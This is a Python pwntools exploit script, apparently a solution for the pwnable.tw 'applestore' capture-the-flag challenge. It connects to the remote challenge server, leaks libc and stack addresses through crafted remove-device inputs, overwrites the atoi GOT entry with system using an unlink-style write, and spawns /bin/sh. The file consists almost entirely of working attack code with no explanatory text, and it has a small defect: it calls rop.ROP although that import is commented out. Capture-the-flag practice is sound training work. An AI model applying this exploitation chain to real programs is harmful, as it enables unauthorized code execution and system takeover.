from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "chall.pwnable.tw"
remote_port = 10104
local_addr = "127.0.0.1"
local_port = 1807

pc = "./applestore"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 1 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x080489FD\n')
		#b *0x0804887F \n 
		#0x400b6a

def ru(a):
	return p.recvuntil(a)

def sn(a):
	p.send(a)

def rl():
	return p.recvline()

def sl(a):
	p.sendline(a)

def rv(a):
	return p.recv(a)

def raddr(a,l=None):
	if l == None:
		return u64(rv(a).ljust(8,'\x00'))
	else:
		return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sa(a,b):
	p.sendafter(a,b)

def sla(a,b):
	p.sendlineafter(a,b)
	
def add_device(idx):
	sla('> ','2')
	sla('> ',str(idx))

def remove_device(idx):
	sla('> ','3')
	sla('> ',str(idx))

def check_out():
	sla('> ','5')
	sla('> ','y')


def hack():
	raw_input()
	# for i in range(0,7174/199):
	# 	for j in range(0,7174/299):
	# 		for k in range(0,7174/399):
	# 			for l in range(0,7174/499):
	# 				if i*199+j*299+k*399+l*499 == 7174:
	# 					print i,j,k,l
	puts_got = pwn_elf.got['puts']
	atoi_got = pwn_elf.got['atoi']
	device_list = 0x0804B070
	for i in range(6):
		add_device(1)
	for i in range(20):
		add_device(2)
	check_out()
	payload = '27'+p32(puts_got)+p32(1)+p32(0)+p32(0)
	remove_device(payload)
	ru('Remove 27:')
	puts_addr = u32(rv(4))
	lg('puts_addr',puts_addr)
	libc.address = puts_addr - libc.symbols['puts']
	lg('libc.address',libc.address)
	system_addr = libc.symbols['system']
	lg('system_addr',system_addr)

	#fake_fd = 
	#fake_bk = 
	payload = '27'+p32(device_list)+p32(1)
	remove_device(payload)
	ru('Remove 27:')
	tmp_addr = u32(rv(4)) + 0x498 + 8
	lg('tmp_addr',tmp_addr)

	payload = '27'+p32(tmp_addr)
	remove_device(payload)
	ru('Remove 27:')
	stack_addr = u32(rv(4))
	lg('stack_addr',stack_addr)

	fake_fd = stack_addr + 0x20 - 0xc
	fake_bk = atoi_got + 0x22
	payload = '27' + p32(stack_addr) + p32(1) + p32(fake_fd) + p32(fake_bk)
	remove_device(payload)
	
	payload = p32(system_addr) + ";/bin/sh\0"
	sla('> ',payload)
	p.interactive()

hack()